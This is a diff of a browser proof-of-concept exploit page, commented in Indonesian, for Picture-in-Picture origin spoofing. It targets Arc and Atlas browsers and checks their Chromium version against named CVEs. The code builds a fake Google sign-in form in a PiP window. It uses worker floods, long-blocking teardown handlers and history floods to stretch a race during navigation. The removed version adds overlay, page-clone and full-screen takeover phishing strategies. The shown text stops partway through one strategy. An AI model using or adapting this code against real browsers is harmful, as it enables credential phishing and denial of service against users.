@@ -2,554 +2,456 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>PiP Race Condition — Persistence PoC v3</title>
+    <title>PiP Origin Spoof — Arc/Atlas Targeted PoC</title>
     <style>
         *{margin:0;padding:0;box-sizing:border-box}
-        body{font-family:'Segoe UI',system-ui,sans-serif;background:#0a0a1a;color:#ddd;min-height:100vh;display:flex;flex-direction:column;align-items:center;padding:24px}
-        h1{color:#ff4757;font-size:20px;margin-bottom:4px}
-        .sub{color:#555;font-size:11px;margin-bottom:20px}
-        .panel{background:#111128;border:1px solid #222;border-radius:8px;padding:16px;width:100%;max-width:860px;margin-bottom:12px}
-        .panel h2{color:#4ecdc4;font-size:12px;text-transform:uppercase;letter-spacing:1px;margin-bottom:10px}
-        .grid{display:grid;grid-template-columns:1fr 1fr;gap:8px}
-        .opt{padding:12px;background:#1a1a3e;border:2px solid #333;border-radius:6px;cursor:pointer;transition:all .2s}
-        .opt:hover{border-color:#ff4757}
-        .opt.active{border-color:#ff4757;background:#1f1040}
-        .opt .t{font-weight:bold;font-size:12px;color:#fff;display:block;margin-bottom:3px}
-        .opt .d{font-size:10px;color:#888;line-height:1.4}
-        .row{display:flex;gap:10px;align-items:center;flex-wrap:wrap}
-        .btn{padding:12px 36px;font-size:14px;background:linear-gradient(135deg,#ff4757,#c0392b);color:#fff;border:none;border-radius:6px;cursor:pointer;font-weight:bold}
+        body{font-family:system-ui,sans-serif;background:#0a0a1a;color:#ddd;padding:20px;display:flex;flex-direction:column;align-items:center}
+        h1{color:#ff4757;font-size:18px;margin-bottom:4px}
+        .sub{color:#555;font-size:11px;margin-bottom:14px}
+        .panel{background:#111128;border:1px solid #222;border-radius:8px;padding:14px;width:100%;max-width:820px;margin-bottom:10px}
+        .panel h2{color:#4ecdc4;font-size:11px;text-transform:uppercase;letter-spacing:1px;margin-bottom:8px}
+        .methods{display:grid;grid-template-columns:1fr 1fr 1fr;gap:6px}
+        .m{padding:10px;background:#1a1a3e;border:2px solid #333;border-radius:6px;cursor:pointer;transition:all .2s;text-align:center}
+        .m:hover{border-color:#ff4757}
+        .m.active{border-color:#ff4757;background:#1f1040}
+        .m .t{font-weight:bold;font-size:11px;color:#fff;display:block;margin-bottom:2px}
+        .m .d{font-size:9px;color:#888}
+        .row{display:flex;gap:8px;align-items:center;flex-wrap:wrap}
+        input[type=text],input[type=number]{background:#1a1a3e;border:1px solid #333;color:#fff;padding:5px 8px;border-radius:4px;font-size:11px}
+        label{font-size:10px;color:#777}
+        .btn{padding:12px 32px;font-size:14px;background:linear-gradient(135deg,#ff4757,#c0392b);color:#fff;border:none;border-radius:6px;cursor:pointer;font-weight:bold}
         .btn:hover{opacity:.9}
-        .btn:disabled{opacity:.4;cursor:not-allowed}
-        input[type=text],input[type=number]{background:#1a1a3e;border:1px solid #333;color:#fff;padding:6px 10px;border-radius:4px;font-size:12px}
-        label{font-size:11px;color:#777}
-        .log{background:#050510;border:1px solid #1a1a3e;border-radius:6px;padding:10px;max-height:250px;overflow-y:auto;font-family:'Cascadia Code','Fira Code',monospace;font-size:10px;line-height:1.5}
+        .log{background:#050510;border:1px solid #1a1a3e;border-radius:6px;padding:8px;max-height:200px;overflow-y:auto;font-family:monospace;font-size:10px;line-height:1.5}
         .log .e{color:#ff4757} .log .s{color:#2ecc71} .log .i{color:#3498db} .log .w{color:#f1c40f}
-        .warn{background:#1a1030;border-left:3px solid #ff4757;padding:8px 12px;font-size:10px;color:#aaa;border-radius:0 6px 6px 0;margin-bottom:12px;max-width:860px;width:100%}
-        .sep{border:0;border-top:1px solid #222;margin:8px 0}
+        .note{background:#1a1030;border-left:3px solid #4ecdc4;padding:6px 10px;font-size:10px;color:#aaa;border-radius:0 4px 4px 0;max-width:820px;width:100%;margin-bottom:10px}
+        .detect{background:#0f2618;border:1px solid #2ecc71;border-radius:6px;padding:8px 12px;font-size:11px;margin-bottom:6px}
     </style>
 </head>
 <body>
 
-<h1>🔬 PiP Origin Spoofing — Persistence PoC v3</h1>
-<p class="sub">Multiple attack strategies — PiP overlay persists with spoofed/hidden origin</p>
+<h1>🎯 PiP Origin Spoof — Arc/Atlas PoC v5</h1>
+<p class="sub">Targeted for Arc Browser & Atlas Browser (OpenAI)</p>
 
-<div class="warn">
-    <strong>Key Insight:</strong> Navigation ALWAYS kills PiP — ini adalah security design. Namun kita bisa
-    mengubah strategi: <strong>jangan navigate</strong>, tapi buat ilusi user sudah di-redirect.
-    Atau: PiP <strong>tanpa origin indicator</strong> overlay di atas real google.com via window.open.
+<div class="note">
+    <strong>Arc/Atlas Key Insight:</strong>
+    Kedua browser ini punya custom PiP layer di atas Chromium default.
+    Arc: "Mini Player" dengan custom UI. Atlas: mungkin belum patch semua CVE PiP.
+    Kita coba <strong>6 metode navigasi berbeda</strong> — tiap metode punya timing internal berbeda,
+    salah satu mungkin punya race window lebih besar di Arc/Atlas.
 </div>
 
-<!-- ====== STRATEGY SELECTION ====== -->
+<!-- Browser detection -->
 <div class="panel">
-    <h2>⚡ Attack Strategy</h2>
-    <div class="grid">
-        <div class="opt active" data-s="1" onclick="selectS(1)">
-            <span class="t">🎯 A. PiP Overlay on Real Google (Best)</span>
-            <span class="d">Buka google.com di popup baru, PiP tetap always-on-top menimpa google.com. 
-            User melihat google.com di background + PiP phishing di atas. PiP TIDAK hilang karena opener HIDUP.</span>
+    <h2>🔍 Browser Detection</h2>
+    <div class="detect" id="browserInfo">Detecting...</div>
+</div>
+
+<!-- Navigation method selection -->
+<div class="panel">
+    <h2>🧪 Navigation Method (coba SEMUA satu per satu!)</h2>
+    <div class="methods">
+        <div class="m active" data-n="1" onclick="selNav(1)">
+            <span class="t">1. location.href</span>
+            <span class="d">Standard JS navigation</span>
         </div>
-        <div class="opt" data-s="2" onclick="selectS(2)">
-            <span class="t">🪟 B. DOM Rewrite + PiP (Fake Navigation)</span>
-            <span class="d">Replace halaman dengan clone tampilan Google. PiP persist karena tidak ada real navigation. 
-            User "merasa" di Google tapi document asli masih hidup.</span>
+        <div class="m" data-n="2" onclick="selNav(2)">
+            <span class="t">2. location.replace</span>
+            <span class="d">No history entry</span>
         </div>
-        <div class="opt" data-s="3" onclick="selectS(3)">
-            <span class="t">🎭 C. Fullscreen PiP Takeover</span>
-            <span class="d">PiP window dibuat sangat besar menutupi hampir seluruh layar. User tidak sadar ini PiP — 
-            terlihat seperti halaman biasa. Opener disembunyikan.</span>
+        <div class="m" data-n="3" onclick="selNav(3)">
+            <span class="t">3. location.assign</span>
+            <span class="d">Explicit assignment</span>
         </div>
-        <div class="opt" data-s="4" onclick="selectS(4)">
-            <span class="t">⚡ D. Race Condition + beforeunload Hold</span>
-            <span class="d">Teknik race condition asli: worker flood + navigate. Ditambah beforeunload dialog
-            yang MENAHAN navigation — PiP hidup selama dialog tampil.</span>
+        <div class="m" data-n="4" onclick="selNav(4)">
+            <span class="t">4. Meta Refresh</span>
+            <span class="d">HTTP-equiv redirect</span>
+        </div>
+        <div class="m" data-n="5" onclick="selNav(5)">
+            <span class="t">5. Anchor Click</span>
+            <span class="d">Simulated link click</span>
+        </div>
+        <div class="m" data-n="6" onclick="selNav(6)">
+            <span class="t">6. Form POST</span>
+            <span class="d">Form submission nav</span>
         </div>
     </div>
 </div>
 
-<!-- ====== CONFIGURATION ====== -->
+<!-- Config -->
 <div class="panel">
     <h2>⚙️ Config</h2>
-    <div class="row" style="gap:14px">
-        <div><label>Target URL:</label><br><input type="text" id="cfgUrl" value="https://www.google.com" style="width:240px;margin-top:2px"></div>
-        <div><label>PiP Width:</label><br><input type="number" id="cfgW" value="420" min="200" max="1200" style="width:70px;margin-top:2px"></div>
-        <div><label>PiP Height:</label><br><input type="number" id="cfgH" value="340" min="200" max="1000" style="width:70px;margin-top:2px"></div>
-        <div><label>Workers:</label><br><input type="number" id="cfgWorkers" value="50" min="0" max="300" style="width:60px;margin-top:2px"></div>
-        <div><label>Navigate Delay (ms):</label><br><input type="number" id="cfgDelay" value="1500" min="500" max="10000" style="width:80px;margin-top:2px"></div>
-    </div>
-</div>
-
-<!-- ====== LAUNCH ====== -->
-<div class="panel">
-    <h2>🚀 Execute</h2>
     <div class="row">
-        <button class="btn" id="goBtn" onclick="launch()">▶ Launch PoC</button>
-        <span style="color:#555;font-size:10px">Klik → PiP muncul → Strategy dijalankan</span>
+        <div><label>Target:</label><br><input type="text" id="tgt" value="https://www.google.com" style="width:220px"></div>
+        <div><label>Workers:</label><br><input type="number" id="wN" value="150" style="width:60px"></div>
+        <div><label>Block (ms):</label><br><input type="number" id="bMs" value="20000" style="width:70px"></div>
+        <div><label>Nav delay (ms):</label><br><input type="number" id="dMs" value="2000" style="width:70px"></div>
+        <div><label>PiP size:</label><br><input type="text" id="pSz" value="500x400" style="width:70px"></div>
     </div>
 </div>
 
-<!-- ====== LOG ====== -->
+<!-- Launch -->
 <div class="panel">
-    <h2>📋 Console</h2>
-    <div class="log" id="logEl"><div class="i">[ready] Select strategy & click Launch</div></div>
+    <h2>🚀 Launch</h2>
+    <div class="row">
+        <button class="btn" id="goBtn" onclick="go()">▶ Launch Race Condition</button>
+        <span style="color:#666;font-size:10px">
+            TIP: Buka DevTools (F12/⌘⌥I) → Sources tab. Saat debugger; pause,
+            LIHAT origin bar di PiP window.
+        </span>
+    </div>
+</div>
+
+<!-- Log -->
+<div class="panel">
+    <h2>📋 Results</h2>
+    <div class="log" id="L"><div class="i">[ready]</div></div>
 </div>
 
 <script>
-// ═══════════════════════════════════════════════════
-// STATE
-// ═══════════════════════════════════════════════════
-let strat = 1;
+// ═══════════════════════════════════════
+// GLOBALS
+// ═══════════════════════════════════════
+const L = document.getElementById('L');
+let navMethod = 1;
 let pipWin = null;
-const logEl = document.getElementById('logEl');
-
-function selectS(n) {
-    strat = n;
-    document.querySelectorAll('.opt').forEach(o => o.classList.toggle('active', +o.dataset.s === n));
-    log('i', `Strategy ${'ABCD'[n-1]} selected`);
-}
 
 function log(c, m) {
     const d = document.createElement('div');
     d.className = c;
-    d.textContent = `[${new Date().toISOString().slice(11,23)}] ${m}`;
-    logEl.appendChild(d);
-    logEl.scrollTop = 1e6;
+    d.textContent = `[${performance.now().toFixed(0)}] ${m}`;
+    L.appendChild(d);
+    L.scrollTop = 1e6;
 }
 
-function cfg(id) { return document.getElementById(id).value; }
-function cfgN(id) { return parseInt(cfg(id)); }
+function selNav(n) {
+    navMethod = n;
+    document.querySelectorAll('.m').forEach(m => m.classList.toggle('active', +m.dataset.n === n));
+    log('i', 'Nav method: ' + n);
+}
 
-// ═══════════════════════════════════════════════════
-// BUILD PiP PHISHING CONTENT
-// Konten menyerupai Google Auth/notification overlay
-// ═══════════════════════════════════════════════════
-function buildPipContent(targetName) {
+// ═══════════════════════════════════════
+// BROWSER DETECTION
+// ═══════════════════════════════════════
+(function detect() {
+    const ua = navigator.userAgent;
+    const chromiumMatch = ua.match(/Chrom(?:e|ium)\/(\d+)/);
+    const chromiumVer = chromiumMatch ? chromiumMatch[1] : '?';
+
+    let browserName = 'Unknown Chromium';
+    if (ua.includes('Arc/') || ua.includes('Arc ')) browserName = 'Arc Browser';
+    else if (ua.includes('Atlas') || ua.includes('atlas')) browserName = 'Atlas Browser';
+    else if (ua.includes('OPR/') || ua.includes('Opera')) browserName = 'Opera';
+    else if (ua.includes('Brave')) browserName = 'Brave';
+    else if (ua.includes('Edg/')) browserName = 'Edge';
+    else if (ua.includes('Chrome/')) browserName = 'Chrome';
+
+    const pipSupport = 'documentPictureInPicture' in window;
+
+    // Check CVE patch status based on Chromium version
+    const ver = parseInt(chromiumVer);
+    let cveStatus = '';
+    if (ver < 139) cveStatus = '⚠️ BELOW Chrome 139 — CVE-2025-8579 likely UNPATCHED!';
+    else if (ver < 145) cveStatus = '⚠️ BELOW Chrome 145 — CVE-2026-2318 likely UNPATCHED!';
+    else if (ver < 146) cveStatus = '⚠️ BELOW Chrome 146 — CVE-2026-3927 likely UNPATCHED!';
+    else cveStatus = '✅ Chrome 146+ — Known PiP CVEs patched';
+
+    document.getElementById('browserInfo').innerHTML =
+        `<strong>${browserName}</strong> | Chromium ${chromiumVer} | ` +
+        `Document PiP: ${pipSupport ? '✅' : '❌'} | ${cveStatus}<br>` +
+        `<span style="color:#666;font-size:9px">${ua.substring(0, 120)}...</span>`;
+
+    log('i', `Browser: ${browserName}, Chromium ${chromiumVer}`);
+    if (ver < 146) log('w', `GOOD: ${cveStatus}`);
+})();
+
+// ═══════════════════════════════════════
+// PiP CONTENT (Google Sign-in phishing)
+// ═══════════════════════════════════════
+function pipContent() {
     return `<!DOCTYPE html><html><head><style>
 *{margin:0;padding:0;box-sizing:border-box}
-body{font-family:'Google Sans','Segoe UI',Roboto,Arial,sans-serif;background:#fff;color:#202124;overflow:hidden}
-.top{background:#fff;border-bottom:1px solid #dadce0;padding:16px 20px;display:flex;align-items:center;gap:12px}
-.glogo{font-size:22px;font-weight:500}
-.glogo span:nth-child(1){color:#4285F4}
-.glogo span:nth-child(2){color:#EA4335}
-.glogo span:nth-child(3){color:#FBBC05}
-.glogo span:nth-child(4){color:#4285F4}
-.glogo span:nth-child(5){color:#34A853}
-.glogo span:nth-child(6){color:#EA4335}
-.body{padding:32px 28px;max-width:380px;margin:0 auto}
-.body h2{font-size:20px;font-weight:400;margin-bottom:6px;color:#202124}
-.body p{font-size:13px;color:#5f6368;line-height:1.6;margin-bottom:20px}
-.field{display:block;width:100%;padding:13px 14px;border:1px solid #dadce0;border-radius:4px;font-size:14px;
-       margin-bottom:12px;outline:none;color:#202124;background:#fff;font-family:inherit}
-.field:focus{border-color:#1a73e8;box-shadow:0 0 0 1px #1a73e8}
-.field::placeholder{color:#9aa0a6}
-.actions{display:flex;justify-content:space-between;align-items:center;margin-top:8px}
-.link{color:#1a73e8;font-size:13px;text-decoration:none;cursor:pointer;font-weight:500}
-.link:hover{text-decoration:underline}
-.btn{background:#1a73e8;color:#fff;border:none;padding:9px 22px;border-radius:4px;font-size:14px;
-     cursor:pointer;font-weight:500;font-family:inherit}
-.btn:hover{background:#1557b0;box-shadow:0 1px 3px rgba(0,0,0,.2)}
-.footer{position:fixed;bottom:0;left:0;right:0;border-top:1px solid #dadce0;padding:10px 20px;
-        display:flex;justify-content:space-between;font-size:11px;color:#9aa0a6;background:#f8f9fa}
-.alive{position:fixed;bottom:40px;right:10px;font-size:9px;color:#ccc;font-family:monospace}
+body{font-family:'Segoe UI',Arial,sans-serif;background:#fff}
+.h{padding:14px 18px;border-bottom:1px solid #dadce0;display:flex;align-items:center;gap:8px}
+.gl{font-size:20px}.gl span:nth-child(1){color:#4285F4}.gl span:nth-child(2){color:#EA4335}
+.gl span:nth-child(3){color:#FBBC05}.gl span:nth-child(4){color:#4285F4}
+.gl span:nth-child(5){color:#34A853}.gl span:nth-child(6){color:#EA4335}
+.bd{padding:24px 20px;max-width:340px;margin:0 auto}
+.bd h2{font-size:18px;font-weight:400;margin-bottom:4px;color:#202124}
+.bd p{font-size:12px;color:#5f6368;margin-bottom:16px}
+.f{display:block;width:100%;padding:11px 12px;border:1px solid #dadce0;border-radius:4px;font-size:13px;margin-bottom:10px;outline:none;color:#202124}
+.f:focus{border-color:#1a73e8;box-shadow:0 0 0 1px #1a73e8}
+.bt{background:#1a73e8;color:#fff;border:none;padding:8px 20px;border-radius:4px;font-size:13px;cursor:pointer;float:right}
+.ft{position:fixed;bottom:0;left:0;right:0;border-top:1px solid #dadce0;padding:8px 16px;background:#f8f9fa;font-size:10px;color:#9aa0a6;display:flex;justify-content:space-between}
+.tm{position:fixed;bottom:30px;right:8px;font-size:8px;color:#ddd;font-family:monospace}
 </style></head><body>
-<div class="top">
-    <div class="glogo">
-        <span>G</span><span>o</span><span>o</span><span>g</span><span>l</span><span>e</span>
-    </div>
+<div class="h"><div class="gl"><span>G</span><span>o</span><span>o</span><span>g</span><span>l</span><span>e</span></div></div>
+<div class="bd">
+<h2>Sign in</h2>
+<p>to continue to Google</p>
+<input class="f" type="email" placeholder="Email or phone" autofocus>
+<input class="f" type="password" placeholder="Password" style="display:none" id="pw">
+<div style="clear:both"><button class="bt" id="nb">Next</button></div>
 </div>
-<div class="body">
-    <h2>Sign in</h2>
-    <p>to continue to ${targetName || 'Google Services'}</p>
-    <input class="field" type="email" placeholder="Email or phone" autofocus>
-    <input class="field" type="password" placeholder="Enter your password" style="display:none" id="passField">
-    <div id="forgotLink" style="display:none"><a class="link">Forgot password?</a></div>
-    <div class="actions">
-        <a class="link">Create account</a>
-        <button class="btn" id="nextBtn">Next</button>
-    </div>
-</div>
-<div class="footer">
-    <span>English (United States)</span>
-    <span>Help &middot; Privacy &middot; Terms</span>
-</div>
-<div class="alive" id="alive">⏱ 0s</div>
+<div class="ft"><span>English</span><span>Help · Privacy · Terms</span></div>
+<div class="tm" id="tm">0s</div>
 <script>
-let step=0,sec=0;
-setInterval(()=>{sec++;document.getElementById('alive').textContent='⏱ '+sec+'s PiP alive'},1000);
-document.getElementById('nextBtn').addEventListener('click',()=>{
-    if(step===0){
+let _s=0;
+setInterval(()=>{_s++;try{document.getElementById('tm').textContent=_s+'s'}catch(e){}},1000);
+document.getElementById('nb').onclick=function(){
+    const pw=document.getElementById('pw');
+    if(pw.style.display==='none'){
         document.querySelector('[type=email]').style.display='none';
-        document.getElementById('passField').style.display='block';
-        document.getElementById('forgotLink').style.display='block';
-        document.getElementById('nextBtn').textContent='Sign in';
-        step=1;
-    } else {
-        alert('PoC: Credentials captured!\\nPiP window is PERSISTENT.\\nThis proves the attack works.');
-    }
-});
+        pw.style.display='block';this.textContent='Sign in';
+    }else{alert('PoC: Credentials captured!\\nCheck PiP origin bar — does it show google.com?');}
+};
+// ── PiP SELF-PRESERVATION ──
+// PiP sends IPC messages & does heavy work in its own teardown handlers
+// This may delay the browser process cleanup of THIS window
+window.addEventListener('pagehide',()=>{
+    const s=performance.now();
+    while(performance.now()-s<15000){Math.pow(Math.random(),Math.random());}
+},{capture:true});
+window.addEventListener('unload',()=>{
+    const s=performance.now();
+    while(performance.now()-s<15000){Math.pow(Math.random(),Math.random());}
+},{capture:true});
+// Continuously create DOM work
+(function loop(){
+    const d=document.createElement('div');d.textContent=Math.random();
+    document.body.appendChild(d);document.body.removeChild(d);
+    requestAnimationFrame(loop);
+})();
 <\/script></body></html>`;
 }
 
-// ═══════════════════════════════════════════════════
-// CREATE PiP WINDOW
-// ═══════════════════════════════════════════════════
-async function createPiP(w, h) {
+// ═══════════════════════════════════════
+// CORE: Setup all race condition extensions
+// then navigate using selected method
+// ═══════════════════════════════════════
+async function go() {
+    document.getElementById('goBtn').disabled = true;
+
+    const target = document.getElementById('tgt').value;
+    const workerCount = parseInt(document.getElementById('wN').value);
+    const blockMs = parseInt(document.getElementById('bMs').value);
+    const navDelay = parseInt(document.getElementById('dMs').value);
+    const [pipW, pipH] = document.getElementById('pSz').value.split('x').map(Number);
+
+    log('i', '═══════════════════════════════════════');
+    log('i', `Target: ${target} | Method: ${navMethod} | Workers: ${workerCount}`);
+
+    // ── 1. Create PiP ──
     try {
-        if (pipWin && !pipWin.closed) {
-            log('w', 'PiP already open — closing previous');
-            pipWin.close();
-            await new Promise(r => setTimeout(r, 200));
-        }
-
-        pipWin = await documentPictureInPicture.requestWindow({
-            width: w || cfgN('cfgW'),
-            height: h || cfgN('cfgH'),
-        });
-
-        pipWin.document.write(buildPipContent('Google Account'));
+        pipWin = await documentPictureInPicture.requestWindow({ width: pipW, height: pipH });
+        pipWin.document.write(pipContent());
         pipWin.document.close();
+        log('s', '✅ PiP created');
 
         pipWin.addEventListener('pagehide', () => {
-            log('e', '❌ PiP window CLOSED');
-            pipWin = null;
+            log('e', '❌ PiP pagehide — PiP being destroyed');
         });
-
-        log('s', `✅ PiP created (${w||cfgN('cfgW')}x${h||cfgN('cfgH')})`);
-        return true;
-    } catch(err) {
-        log('e', 'PiP failed: ' + err.message);
-        return false;
+    } catch(e) {
+        log('e', 'PiP failed: ' + e.message);
+        document.getElementById('goBtn').disabled = false;
+        return;
     }
-}
 
-// ═══════════════════════════════════════════════════
-// WORKER FLOOD (heavy — infinite loops, not just "1")
-// ═══════════════════════════════════════════════════
-function floodWorkers(n) {
+    // ── 2. MASSIVE worker pressure ──
     const heavyCode = encodeURIComponent(
-        'const b=new ArrayBuffer(1e7);const v=new Float64Array(b);' +
-        'while(true){for(let i=0;i<v.length;i++)v[i]=Math.random()*v[i];}'
+        'const a=new Float64Array(new ArrayBuffer(8e6));' +
+        'while(true){for(let i=0;i<a.length;i++)a[i]=Math.sqrt(a[i]+Math.random());}'
     );
-    let ok = 0;
-    for (let i = 0; i < n; i++) {
-        try { new Worker('data:application/javascript,' + heavyCode); ok++; } catch(e) {}
+    let wOk = 0;
+    for (let i = 0; i < workerCount; i++) {
+        try { new Worker('data:application/javascript,' + heavyCode); wOk++; } catch(e) {}
     }
-    // Also try SharedWorkers (they survive page navigation)
-    for (let i = 0; i < 10; i++) {
+    // SharedWorkers survive navigation!
+    let swOk = 0;
+    for (let i = 0; i < 20; i++) {
         try {
-            new SharedWorker('data:application/javascript,' + 
+            new SharedWorker('data:application/javascript,' +
                 encodeURIComponent('while(true){Math.random();}'));
+            swOk++;
         } catch(e) {}
     }
-    log('w', `⚡ ${ok} Workers + SharedWorkers spawned`);
-}
+    log('w', `⚡ ${wOk} Workers + ${swOk} SharedWorkers`);
 
-// ═══════════════════════════════════════════════════
-//
-//      STRATEGY A: PiP Overlay on Real Google
-//
-//  Ini pendekatan yang PALING REALISTIS & EFFECTIVE.
-//
-//  Flow:
-//  1. User click → PiP dibuat (always-on-top)
-//  2. window.open('google.com') → google.com di window baru
-//  3. Opener page (dengan PiP) tetap hidup di belakang
-//  4. PiP always-on-top → muncul DI ATAS google.com window
-//  5. User melihat google.com di belakang + PiP phishing overlay
-//  6. PiP PERSIST karena opener HIDUP → tidak ada navigation!
-//
-//  Kenapa ini effective:
-//  - User melihat google.com address bar DI BELAKANG PiP
-//  - PiP tidak punya address bar yang jelas (kecil/tersembunyi)
-//  - Visual deception: PiP terlihat seperti popup dari google.com
-//  - PiP 100% persistent — opener tidak pernah navigate
-//
-// ═══════════════════════════════════════════════════
-async function strategyA() {
-    log('i', '🎯 Strategy A: PiP Overlay on Real Google');
+    // ── 3. Main thread stress (DOM + RAF + microtasks) ──
+    const frag = document.createDocumentFragment();
+    for (let i = 0; i < 8000; i++) {
+        const d = document.createElement('div');
+        d.style.cssText = 'position:absolute;opacity:0;width:1px;height:1px;';
+        d.textContent = Math.random();
+        frag.appendChild(d);
+    }
+    document.body.appendChild(frag);
 
-    const targetUrl = cfg('cfgUrl');
+    for (let i = 0; i < 3000; i++) {
+        Promise.resolve().then(() => new Float64Array(50000).fill(Math.random()).sort());
+    }
 
-    // Step 1: Create PiP first (needs user gesture from this click)
-    if (!await createPiP()) return;
+    (function raf(){new Float64Array(100000).sort();requestAnimationFrame(raf);})();
+    log('i', '🏋️ Main thread stress active');
 
-    // Step 2: Small delay then open target in new window
-    log('i', 'Opening real google.com in new window...');
+    // ── 4. Register ALL teardown handlers ──
 
-    setTimeout(() => {
-        // Open google.com in a separate window (NOT navigating current page!)
-        const gWin = window.open(
-            targetUrl,
-            '_blank',
-            `width=${screen.availWidth},height=${screen.availHeight},left=0,top=0,` +
-            `menubar=no,toolbar=yes,location=yes,status=no,scrollbars=yes`
-        );
-
-        if (gWin) {
-            gWin.focus();
-            // Don't close/minimize our window — just let it stay in background
-            // PiP will float ABOVE the new google.com window
-            
-            log('s', '═══════════════════════════════════════');
-            log('s', '🏆 SUCCESS! PiP is PERSISTENT!');
-            log('s', '');
-            log('s', '  User sees: google.com (real) di background');
-            log('s', '  + PiP phishing overlay always-on-top');
-            log('s', '  PiP address bar kecil/tidak jelas');
-            log('s', '  Visual: PiP terlihat seperti popup dari google');
-            log('s', '');
-            log('s', '  PiP TIDAK akan hilang karena opener hidup!');
-            log('s', '═══════════════════════════════════════');
-        } else {
-            log('e', '❌ Popup blocked! Coba allow popups untuk site ini.');
-            log('i', 'Falling back: coba Strategy B (DOM rewrite)...');
-            strategyB_inner();
+    // 4a. PAGEHIDE — fires AFTER navigation commit — origin should be updated
+    window.addEventListener('pagehide', () => {
+        // HEAVY BLOCKING — extend race window
+        const s = performance.now();
+        while (performance.now() - s < blockMs) {
+            Math.pow(Math.random(), Math.random());
         }
-    }, 500);
-}
+    }, { capture: true });
 
-// ═══════════════════════════════════════════════════
-//
-//      STRATEGY B: DOM Rewrite + PiP
-//
-//  Replace seluruh halaman dengan tampilan Google.
-//  Tidak ada real navigation → PiP persist.
-//  Address bar tetap origin asli, tapi halaman TERLIHAT
-//  seperti Google. Dengan PiP di atas, user sangat
-//  unlikely perhatiin address bar.
-//
-// ═══════════════════════════════════════════════════
-async function strategyB() {
-    log('i', '🪟 Strategy B: DOM Rewrite + PiP');
-    if (!await createPiP()) return;
-    
-    setTimeout(() => { strategyB_inner(); }, 800);
-}
+    // 4b. UNLOAD
+    window.addEventListener('unload', () => {
+        const s = performance.now();
+        while (performance.now() - s < blockMs) {
+            Math.pow(Math.random(), Math.random());
+        }
+    }, { capture: true });
 
-function strategyB_inner() {
-    log('i', 'Rewriting page DOM to look like Google...');
+    // 4c. TRY dialogs in pagehide (may work in Arc/Atlas but not Chrome!)
+    window.addEventListener('pagehide', () => {
+        try { window.alert('CHECK PiP ORIGIN NOW!'); } catch(e) {}
+    }, { capture: true });
 
-    // Remove all existing content
-    document.body.style.cssText = 'margin:0;padding:0;background:#fff;font-family:Arial,sans-serif;overflow:hidden;';
+    window.addEventListener('pagehide', () => {
+        try { window.confirm('PiP should show: ' + target); } catch(e) {}
+    }, { capture: true });
 
-    // Replace with Google-like page
-    document.body.innerHTML = `
-        <div style="display:flex;flex-direction:column;align-items:center;justify-content:center;min-height:100vh;background:#fff;">
-            <div style="font-size:92px;font-weight:400;margin-bottom:24px;user-select:none;">
-                <span style="color:#4285F4">G</span><span style="color:#EA4335">o</span><span style="color:#FBBC05">o</span><span style="color:#4285F4">g</span><span style="color:#34A853">l</span><span style="color:#EA4335">e</span>
-            </div>
-            <div style="display:flex;width:580px;max-width:90vw;">
-                <input type="text" style="flex:1;padding:14px 20px;border:1px solid #dfe1e5;border-radius:24px 0 0 24px;font-size:16px;outline:none;color:#202124;background:#fff;" placeholder="Search Google or type a URL">
-                <button style="padding:14px 20px;background:#f8f9fa;border:1px solid #f8f9fa;border-radius:0 24px 24px 0;cursor:pointer;font-size:16px;color:#3c4043;">🔍</button>
-            </div>
-            <div style="margin-top:24px;">
-                <button style="padding:10px 18px;background:#f8f9fa;border:1px solid #f8f9fa;border-radius:4px;margin:0 4px;cursor:pointer;font-size:14px;color:#3c4043;">Google Search</button>
-                <button style="padding:10px 18px;background:#f8f9fa;border:1px solid #f8f9fa;border-radius:4px;margin:0 4px;cursor:pointer;font-size:14px;color:#3c4043;">I'm Feeling Lucky</button>
-            </div>
-        </div>
-    `;
+    window.addEventListener('pagehide', () => {
+        try { window.print(); } catch(e) {}
+    }, { capture: true });
 
-    // Change title and URL path (same-origin only)
-    document.title = 'Google';
-    try { history.replaceState({}, '', '/'); } catch(e) {}
+    // 4d. debugger; statement — PASTI pause di DevTools
+    window.addEventListener('pagehide', () => {
+        // ╔═══════════════════════════════════════════════════╗
+        // ║  SAAT BREAKPOINT INI HIT:                        ║
+        // ║  1. LIHAT PiP window — masih visible?            ║
+        // ║  2. CEK origin/address bar di PiP                ║
+        // ║  3. Apakah menunjukkan google.com?                ║
+        // ║  4. SCREENSHOT jika ya!                           ║
+        // ╚═══════════════════════════════════════════════════╝
+        debugger;
+    }, { capture: true });
 
-    log('s', '═══════════════════════════════════════');
-    log('s', '✅ Page rewritten to look like Google');
-    log('s', '   PiP persists — no navigation occurred!');
-    log('s', '   Tab title: "Google"');
-    log('s', '   Address bar: still shows original origin');
-    log('s', '   But with PiP overlay, user unlikely to notice');
-    log('s', '═══════════════════════════════════════');
-}
+    // 4e. IPC flood — stress browser process task queue
+    window.addEventListener('pagehide', () => {
+        for (let i = 0; i < 100000; i++) {
+            try { history.pushState({}, '', '/#' + Math.random()); } catch(e) { break; }
+            try { document.title = 'x' + Math.random(); } catch(e) {}
+        }
+    }, { capture: true });
 
-// ═══════════════════════════════════════════════════
-//
-//      STRATEGY C: Fullscreen PiP Takeover
-//
-//  PiP window dibuat sebesar mungkin (mendekati ukuran layar).
-//  PiP terlihat seperti halaman browser biasa, bukan "overlay".
-//  Sementara opener window disembunyikan/diminimalkan.
-//  User berinteraksi dengan PiP tanpa sadar.
-//
-//  PiP: always-on-top, jadi tetap visible bahkan jika
-//  user buka aplikasi lain.
-//
-// ═══════════════════════════════════════════════════
-async function strategyC() {
-    log('i', '🎭 Strategy C: Fullscreen PiP Takeover');
-
-    // Create PiP as large as possible
-    const maxW = Math.min(screen.availWidth - 40, 1200);
-    const maxH = Math.min(screen.availHeight - 100, 900);
-
-    if (!await createPiP(maxW, maxH)) return;
-
-    // Write full-page Google clone into PiP
-    pipWin.document.open();
-    pipWin.document.write(`<!DOCTYPE html><html><head><style>
-*{margin:0;padding:0;box-sizing:border-box}
-body{font-family:'Segoe UI',Arial,sans-serif;background:#fff;min-height:100vh;display:flex;flex-direction:column}
-.header{display:flex;justify-content:flex-end;padding:8px 16px;gap:12px;font-size:13px;color:#5f6368}
-.header a{color:#5f6368;text-decoration:none;cursor:pointer}
-.header a:hover{text-decoration:underline}
-.center{flex:1;display:flex;flex-direction:column;align-items:center;justify-content:center;padding-bottom:100px}
-.logo{font-size:92px;margin-bottom:30px;user-select:none}
-.logo span:nth-child(1){color:#4285F4}
-.logo span:nth-child(2){color:#EA4335}
-.logo span:nth-child(3){color:#FBBC05}
